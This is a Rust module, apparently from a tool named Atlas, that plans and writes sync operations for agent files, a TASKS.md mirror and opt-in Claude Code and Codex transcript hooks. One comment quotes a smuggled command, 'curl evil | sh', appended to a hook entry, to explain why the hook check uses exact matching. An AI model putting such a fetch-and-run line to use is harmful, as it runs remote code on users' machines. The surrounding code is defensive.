/// The exact first line of the `TASKS.md` mirror. The file is generated in full on
/// every sync, but a human who opens the repository still needs to be told, at a
/// glance, that the board in Atlas is the source of truth and not this file.
const TASKS_MD_HEADER: &str = "<!-- generated by atlas; the board in Atlas is the source of truth -->";

/// The `Stop` hook command Claude Code runs when a turn ends. `--hook-stdin`
/// makes the CLI read Claude Code's hook JSON itself, so the entry needs no
/// `jq` and no shell.
const CLAUDE_HOOK_COMMAND: &str = "atlas ingest --tool claude-code --hook-stdin";

/// Whether a `Stop` command is the entry this sync installs. The marker is exact,
/// because the settings file is not always the user's own work: a repository can
/// ship one, and `atlas ingest --tool x --hook-stdin; curl evil | sh` would
/// otherwise read as "already installed" and be reported Unchanged, telling the
/// user nothing. Atlas never runs the command either way, but `--check` is where
/// they would find out.
fn is_atlas_hook(command: &str) -> bool {
    command.trim() == CLAUDE_HOOK_COMMAND
}

/// Whether a `Stop` command is some other `atlas ingest`: a user who edited the
/// flags, or something wearing the name. Either way it is not ours to add beside,
/// so the op is skipped with a reason rather than silently doubled or overwritten.
fn is_other_atlas_ingest(command: &str) -> bool {
    let command = command.trim();
    command.starts_with("atlas ingest") && !is_atlas_hook(command)
}

/// Why a Claude Code hook op leaves an existing `atlas ingest` entry alone.
const CLAUDE_HOOK_TAKEN: &str = "a different atlas ingest hook is present";

/// The `notify` argv Codex runs when a turn completes. Codex appends the
/// notification JSON as the last element, which is why the command ends on a
/// flag: `atlas ingest --tool codex --hook-arg <json>`.
const CODEX_NOTIFY: &[&str] = &["atlas", "ingest", "--tool", "codex", "--hook-arg"];

/// Why a Codex hook op leaves an existing `notify` alone.
const CODEX_NOTIFY_TAKEN: &str = "notify already set to another command";

/// Inputs describing one sync pass: the repo (or, for a global sync, home
/// directory) root, the agents to export, the managed-block context, and
/// which targets to write.
pub struct SyncInputs<'a> {
    pub root: &'a Path,
    pub agents: &'a [Agent],
    pub block: BlockContext,
    pub targets: &'a [SyncKind],
    /// The directory holding `.codex`. Codex reads one config file per user
    /// rather than one per repository, so its hook lands in the sync home even
    /// when the rest of the pass writes into a project.
    pub home: &'a Path,
    /// Whether the transcript hooks may be installed. The backend resolves it
    /// from `extraction.enabled`: installing a hook that feeds transcripts to a
    /// model is not something a sync should do behind the user's back.
    pub hooks: bool,
    /// Whether `root` is the sync home rather than a repository. It decides which
    /// Claude Code settings file the Stop hook goes into; see [`claude_settings_file`].
    pub global: bool,
    /// Whether the `TASKS.md` mirror may be written. The backend resolves it from
    /// `board.mirror_tasks_md`: a file copy of the board only happens when asked,
    /// since it can drift from the database, which stays the source of truth.
    pub mirror_tasks_md: bool,
    /// The project's effective stages and its open-plus-done tasks, rendered into
    /// `TASKS.md` when `mirror_tasks_md` is true. Empty for a global sync, which
    /// has no project to mirror.
    pub board_stages: &'a [Stage],
    pub board_tasks: &'a [Task],
}

/// Which Claude Code settings file under `.claude/` the Stop hook belongs in.
///
/// Claude Code splits project settings in two: `settings.json` is the shared file
/// meant to be committed, and `settings.local.json` is the personal one its default
/// gitignore handling keeps out of the repository. The hook is a per-machine opt-in
/// that posts transcripts to whatever endpoint *this* Atlas is pointed at, so it
/// goes in the personal half: committing it would turn every teammate's turn into a
/// failed hook, or an ingest against their own endpoint, from a settings change they
/// never made. A global sync writes `<home>/.claude/settings.json`, which is already
/// per-user and is not in any repository.
fn claude_settings_file(global: bool) -> &'static str {
    if global { "settings.json" } else { "settings.local.json" }
}

/// Computes what a sync would do, without touching the filesystem beyond
/// reading existing files to decide each op's action.
pub fn plan_sync(i: &SyncInputs) -> Result<Vec<SyncOp>> {
    let mut ops = Vec::new();
    for kind in i.targets {
        match kind {
            SyncKind::Claude => {
                for a in i.agents {
                    let path = i.root.join(".claude/agents").join(format!("{}.md", a.name));
                    ops.push(agent_op(*kind, path, export::claude_agent_md(a))?);
                }
            }
            SyncKind::Codex => {
                for a in i.agents {
                    let path = i.root.join(".codex/agents").join(format!("{}.toml", a.name));
                    ops.push(agent_op(*kind, path, export::codex_agent_toml(a))?);
                }
            }
            SyncKind::AgentsMd => ops.push(block_op(*kind, i.root.join("AGENTS.md"), &i.block)?),
            SyncKind::ClaudeMd => ops.push(block_op(*kind, i.root.join("CLAUDE.md"), &i.block)?),
            SyncKind::ClaudeHook => {
                if i.hooks {
                    ops.push(claude_hook_op(i.root.join(".claude").join(claude_settings_file(i.global)))?);
                }
            }
            SyncKind::CodexHook => {
                if i.hooks {
                    ops.push(codex_hook_op(i.home.join(".codex/config.toml"))?);
                }
            }
            SyncKind::TasksMd => {
                if i.mirror_tasks_md {
                    let body = render_board_markdown(i.board_stages, i.board_tasks);
                    let content = format!("{TASKS_MD_HEADER}\n\n{body}");
                    ops.push(tasks_md_op(*kind, i.root.join("TASKS.md"), content)?);
                }
            }
            SyncKind::FrameworkInstructions => {
                for adapter in frameworks::adapters() {
                    if adapter.detect(i.root).is_none() {
                        continue;
                    }
                    for path in adapter.instruction_targets(i.root) {
                        ops.push(framework_block_op(*kind, path, &i.block)?);
                    }
                }
            }
        }
    }
    Ok(ops)
}

/// An exporter-owned file (`.claude/agents/*.md`, `.codex/agents/*.toml`):
/// refuses to overwrite a hand-written file that doesn't carry the generated
/// header.
fn agent_op(kind: SyncKind, path: PathBuf, content: String) -> Result<SyncOp> {
    let action = if !path.exists() {
        SyncAction::Create
    } else {
        let existing = std::fs::read_to_string(&path)?;
        if !export::is_generated(&existing) {
            SyncAction::Skip("not generated by atlas".into())
        } else if existing == content {
            SyncAction::Unchanged
        } else {
            SyncAction::Update
        }
    };
    Ok(SyncOp { kind, path, content, action })
}

/// A managed-block file (`AGENTS.md`, `CLAUDE.md`): the file itself is
/// user-owned, only the block between the markers is atlas-managed, so it is
/// never skipped.
fn block_op(kind: SyncKind, path: PathBuf, block: &BlockContext) -> Result<SyncOp> {
    let existed = path.exists();
    let existing = if existed { std::fs::read_to_string(&path)? } else { String::new() };
    // `render_block` ends with a trailing newline after `END`; `splice_block`
    // expects a bare marker-delimited block and owns newline placement
    // itself, so strip it before handing the block over.
    let rendered = export::render_block(block);
    let content = export::splice_block(&existing, rendered.trim_end());
    let action = if !existed {
        SyncAction::Create
    } else if existing == content {
        SyncAction::Unchanged
    } else {
        SyncAction::Update
    };
    Ok(SyncOp { kind, path, content, action })
}

/// A framework's own instruction file (`CLAUDE.md`, `AGENTS.md`, or whatever else an
/// adapter's `instruction_targets` names): the same managed block `block_op` splices
/// into `AGENTS.md`/`CLAUDE.md`, but the file itself is never created here: Atlas
/// only edits inside one that already exists. `instruction_targets` already filters
/// to files present on disk, so this only turns up empty if one was removed between
/// that call and this write; treated as a skip rather than a create in that case.
fn framework_block_op(kind: SyncKind, path: PathBuf, block: &BlockContext) -> Result<SyncOp> {
    if !path.is_file() {
        return Ok(SyncOp { kind, path, content: String::new(), action: SyncAction::Skip("the framework instruction file no longer exists".into()) });
    }
    let existing = std::fs::read_to_string(&path)?;
    let rendered = export::render_block(block);
    let content = export::splice_block(&existing, rendered.trim_end());
    let action = if existing == content { SyncAction::Unchanged } else { SyncAction::Update };
    Ok(SyncOp { kind, path, content, action })
}

/// The `TASKS.md` mirror: the whole file is generated content, not a block spliced
/// into something the user owns, so an existing file is simply compared and
/// replaced. It is never read back and, unlike `agent_op`, never skipped for being
/// hand-written: the header line is descriptive here, not a marker this checks.
fn tasks_md_op(kind: SyncKind, path: PathBuf, content: String) -> Result<SyncOp> {
    let action = if !path.exists() {
        SyncAction::Create
    } else {
        let existing = std::fs::read_to_string(&path)?;
        if existing == content { SyncAction::Unchanged } else { SyncAction::Update }
    };
    Ok(SyncOp { kind, path, content, action })
}

/// A Claude Code settings file: user-owned, and Atlas only adds one `Stop`
/// entry to it. Every other key, and every other `Stop` entry, is carried through
/// untouched, and a file whose shape we do not recognise is left alone rather
/// than rewritten.
fn claude_hook_op(path: PathBuf) -> Result<SyncOp> {
    let kind = SyncKind::ClaudeHook;
    let existed = path.exists();
    let existing = if existed { std::fs::read_to_string(&path)? } else { String::new() };
    let mut settings = if existing.trim().is_empty() {
        serde_json::Value::Object(Default::default())
    } else {
        match serde_json::from_str::<serde_json::Value>(&existing) {
            Ok(v) => v,
            Err(e) => return Ok(SyncOp { kind, path, content: existing, action: SyncAction::Skip(format!("not valid JSON: {e}")) }),
        }
    };
    let action = match insert_stop_hook(&mut settings) {
        Err(reason) => return Ok(SyncOp { kind, path, content: existing, action: SyncAction::Skip(reason) }),
        // Already installed: answer with the file as it stands, so a sync never
        // reformats a settings.json it had nothing to add to.
        Ok(false) => return Ok(SyncOp { kind, path, content: existing, action: SyncAction::Unchanged }),
        Ok(true) if existed => SyncAction::Update,
        Ok(true) => SyncAction::Create,
    };
    let content = format!("{}\n", serde_json::to_string_pretty(&settings)?);
    Ok(SyncOp { kind, path, content, action })
}

/// Adds the `Stop` entry to a parsed settings file. `Ok(true)` when it was added,
/// `Ok(false)` when our exact command was already there, and `Err(reason)` when a
/// key on the way holds a shape this cannot merge into, or when some other
/// `atlas ingest` command holds the slot.
fn insert_stop_hook(settings: &mut serde_json::Value) -> std::result::Result<bool, String> {
    use serde_json::Value;
    let root = settings.as_object_mut().ok_or("settings.json does not hold a JSON object")?;
    let hooks = root.entry("hooks").or_insert_with(|| Value::Object(Default::default()));
    let hooks = hooks.as_object_mut().ok_or("hooks is not a JSON object")?;
    let stop = hooks.entry("Stop").or_insert_with(|| Value::Array(Vec::new()));
    let stop = stop.as_array_mut().ok_or("hooks.Stop is not a JSON array")?;
    let commands = || {
        stop.iter()
            .filter_map(|entry| entry["hooks"].as_array())
            .flatten()
            .filter_map(|h| h["command"].as_str())
    };
    if commands().any(is_atlas_hook) {
        return Ok(false);
    }
    if commands().any(is_other_atlas_ingest) {
        return Err(CLAUDE_HOOK_TAKEN.to_string());
    }
    stop.push(serde_json::json!({ "hooks": [{ "type": "command", "command": CLAUDE_HOOK_COMMAND }] }));
    Ok(true)
}

/// Codex's `config.toml`: edited through `toml_edit` so comments, ordering and
/// formatting survive. Codex supports a single `notify` command, so one that is
/// already set to something else is reported and left alone rather than taken
/// over.
fn codex_hook_op(path: PathBuf) -> Result<SyncOp> {
    let kind = SyncKind::CodexHook;
    let existing = if path.exists() { std::fs::read_to_string(&path)? } else { String::new() };
    let mut doc = match existing.parse::<toml_edit::DocumentMut>() {
        Ok(d) => d,
        Err(e) => return Ok(SyncOp { kind, path, content: existing, action: SyncAction::Skip(format!("not valid TOML: {e}")) }),
    };
    if let Some(item) = doc.get("notify") {
        let ours = item.as_array().is_some_and(|a| {
            a.len() == CODEX_NOTIFY.len() && a.iter().zip(CODEX_NOTIFY).all(|(v, want)| v.as_str() == Some(*want))
        });
        let action = if ours { SyncAction::Unchanged } else { SyncAction::Skip(CODEX_NOTIFY_TAKEN.into()) };
        return Ok(SyncOp { kind, path, content: existing, action });
    }
    let mut argv = toml_edit::Array::new();
    for word in CODEX_NOTIFY {
        argv.push(*word);
    }
    doc["notify"] = toml_edit::value(argv);
    Ok(SyncOp { kind, path, content: doc.to_string(), action: SyncAction::Create })
}

/// Writes every `Create`/`Update` op to disk, creating parent directories as
/// needed, then returns the tally. Stops at the first write failure and
/// reports the failing path plus how many of the planned writes had already
/// completed, since a bare io error gives no way to tell which file or how
/// much progress was made.
pub fn apply(ops: &[SyncOp]) -> Result<SyncReport> {
    let total = ops.iter().filter(|o| matches!(o.action, SyncAction::Create | SyncAction::Update)).count();
    let mut done = 0usize;
    for op in ops {
        if matches!(op.action, SyncAction::Create | SyncAction::Update) {
            let write = || -> std::io::Result<()> {
                if let Some(parent) = op.path.parent() {
                    std::fs::create_dir_all(parent)?;
                }
                std::fs::write(&op.path, &op.content)
            };
            write().map_err(|e| {
                AtlasError::Other(format!("sync: failed to write {}: {e} ({done} of {total} files written)", op.path.display()))
            })?;
            done += 1;
        }
    }
    Ok(summarize(ops))
}

/// Tallies a set of ops into a report without writing anything.
pub fn summarize(ops: &[SyncOp]) -> SyncReport {
    let mut report = SyncReport { ops: ops.to_vec(), ..Default::default() };
    for op in ops {
        match &op.action {
            SyncAction::Create => report.created += 1,
            SyncAction::Update => report.updated += 1,
            SyncAction::Unchanged => report.unchanged += 1,
            SyncAction::Skip(_) => report.skipped += 1,
        }
    }
    report
}

